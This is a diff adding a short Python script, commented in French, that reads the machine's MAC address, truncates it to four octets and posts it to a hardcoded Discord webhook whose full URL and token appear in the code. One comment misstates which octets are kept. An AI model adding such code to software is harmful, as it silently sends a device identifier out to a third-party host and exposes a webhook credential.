@@ -1,2 +1,28 @@
-None
-lifoho = ""
+import uuid
+import requests
+
+# Obtenir l'adresse MAC de la machine
+def get_mac_address():
+    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
+    return mac
+
+# Simplifier l'adresse MAC pour n'afficher que les deux premiers et deux derniers octets
+def simplify_mac_address(mac):
+    return '-'.join([mac[i:i+2] for i in range(0, len(mac), 2)])
+
+# Envoyer l'adresse MAC simplifiée à un webhook Discord
+def send_to_discord(webhook_url, message):
+    data = {"content": message}
+    response = requests.post(webhook_url, json=data)
+    return response.status_code
+
+# Définir l'URL du webhook Discord
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1200805594781712506/aUVfkM3l1UFnI22xaDYrol3DifYVabZKWFbSKev1rxDscmELl5nsAX733TdP2ShC74l5'  # Remplacez par votre URL de webhook
+
+# Récupérer et simplifier l'adresse MAC
+mac_address = get_mac_address()
+simplified_mac = simplify_mac_address(mac_address)[:11]  # xx-xx-xx-xx
+
+# Envoyer l'adresse MAC simplifiée au webhook Discord
+status_code = send_to_discord(WEBHOOK_URL, f"Adresse MAC simplifiée : {simplified_mac}")
+print(f"Le statut de l'envoi est : {status_code}")
